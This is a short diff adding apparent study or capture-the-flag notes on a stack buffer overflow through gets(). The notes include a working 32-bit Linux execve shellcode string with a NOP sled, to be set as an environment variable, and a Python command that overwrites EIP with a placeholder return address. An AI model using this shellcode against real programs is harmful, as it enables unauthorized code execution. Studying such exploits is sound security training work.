@@ -1,0 +1,10 @@
+buffer overflow to jump to shellcode.
+
+gets - using gets to overflow eip and point to an env var that contains a nop sled and a shell code.
+
+$(python -c 'print "A"*(for overflow) + "\xad\xdr\xes\xss"(put correct adr here)')
+
+before remember to set env var:
+
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+
